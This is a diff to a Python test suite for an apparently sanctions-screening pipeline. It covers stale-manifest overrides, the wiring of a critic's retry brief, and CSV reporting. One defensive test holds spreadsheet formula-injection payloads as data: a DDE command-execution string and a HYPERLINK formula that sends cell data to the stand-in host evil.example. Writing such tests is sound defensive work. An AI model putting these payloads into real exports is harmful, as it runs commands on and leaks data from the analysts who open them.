@@ -123,10 +123,17 @@ class TestStaleness(PipelineCase):
         self.assertIn("Refusing to screen", str(ctx.exception))
 
     def test_override_is_recorded_in_the_audit_log(self):
-        stale = Manifest(created_at="", engine_version="", files=[
-            {"code": "SDN", "fetched_at": (datetime.now(timezone.utc) - timedelta(days=99)).isoformat(),
-             "sha256": "x"}], total_parties=1, digest="d")
-        (self.data / "manifest.json").write_text(json.dumps(stale.to_dict()))
+        # Age the real refreshed manifest rather than fabricating one: a
+        # fabricated manifest no longer reaches the staleness check at all,
+        # because it cannot vouch for the corpus (no corpus_sha256) or its
+        # coverage.
+        p = self.data / "manifest.json"
+        man = json.loads(p.read_text())
+        for f in man["files"]:
+            if f.get("fetched_at"):
+                f["fetched_at"] = (
+                    datetime.now(timezone.utc) - timedelta(days=99)).isoformat()
+        p.write_text(json.dumps(man))
         subjects, _ = parse_party_file("name\nAcme\n")
         run(subjects, self.data, self.audit, use_llm=False, use_critic=False, allow_stale=True)
         starts = [e for e in AuditLog(self.audit).entries() if e["event"] == "run.start"]
@@ -262,6 +269,45 @@ class TestDeterminismEndToEnd(PipelineCase):
         self.assertEqual(sig(a), sig(b))
 
 
+class TestCriticLoopWiring(PipelineCase):
+    """The critic's brief must reach the adjudicator PROMPT through the real
+    pipeline wiring.
+
+    The unit test on `run_loop` proves only that the loop hands the brief to
+    `adjudicate_fn`; an earlier pipeline implementation accepted it there and
+    stapled it onto the output after the model had answered, so with
+    temperature-0 backends all four attempts sent byte-identical prompts and
+    the advertised retry-to-improve control was inert.
+    """
+
+    def test_retry_prompts_carry_the_brief_and_differ_from_the_first(self):
+        from xscreen.models import SubjectParty
+        from xscreen.tests.test_guardrails import FakeBackend, adj_payload
+
+        finding = "the dismissal rests on an address mismatch alone"
+        worker = FakeBackend(adj_payload("SDN:1001", "DIFFERENT_PARTY", 0.9))
+        critic = FakeBackend({
+            "verdict": "FAIL", "risk_score": 0.9, "summary": "not convinced",
+            "findings": [{"listed_uid": "SDN:1001", "severity": "major",
+                          "finding": finding, "suggested_action": "recheck"}],
+        })
+        subjects = [SubjectParty(ref="C-1", name="Northwind Heavy Machinery")]
+        results, _ = run(subjects, self.data, self.audit, use_llm=True,
+                         use_critic=True, backend=worker, critic_backend=critic,
+                         as_of=date(2026, 1, 15))
+
+        prompts = [user for _, user in worker.calls]
+        self.assertGreaterEqual(len(prompts), 2)
+        self.assertNotIn("KNOWN_ISSUES", prompts[0])
+        for p in prompts[1:]:
+            self.assertIn("KNOWN_ISSUES", p)
+            self.assertIn(finding, p)
+        # A persistent FAIL still escalates to a human; the brief makes the
+        # retry meaningful, it does not weaken the routing.
+        self.assertEqual(results[0].disposition, "ESCALATE")
+        self.assertTrue(results[0].requires_human)
+
+
 class TestReporting(PipelineCase):
     def test_csv_has_a_row_per_subject(self):
         results, _ = self._run()
@@ -283,6 +329,27 @@ class TestReporting(PipelineCase):
     def test_markdown_states_when_adjudication_was_disabled(self):
         results, summary = self._run()
         self.assertIn("every candidate routed to a human", markdown_report(results, summary))
+
+    def test_csv_neutralizes_spreadsheet_formula_injection(self):
+        # A counterparty is attacker-chosen text, and dispositions.csv is
+        # opened in Excel by a compliance analyst. A leading = + - @ must not
+        # survive as a live formula.
+        import csv as _csv
+        import io as _io
+        from xscreen.models import ScreeningResult
+        r = ScreeningResult(
+            subject={"ref": "=cmd|' /C calc'!A0",
+                     "name": '=HYPERLINK("http://evil.example/?x"&A1,"click")'},
+            disposition="REVIEW", disposition_reason="test")
+        rows = list(_csv.reader(_io.StringIO(summary_csv([r]))))
+        header, body = rows[0], rows[1]
+        for col in ("ref", "name"):
+            cell = body[header.index(col)]
+            self.assertTrue(cell.startswith("'"), cell)
+        # Every parsed cell in every row must be inert.
+        for row in rows[1:]:
+            for cell in row:
+                self.assertFalse(cell.startswith(("=", "+", "@", "\t")), cell)
 
     def test_pipe_characters_in_names_do_not_break_the_table(self):
         from xscreen.models import ScreeningResult
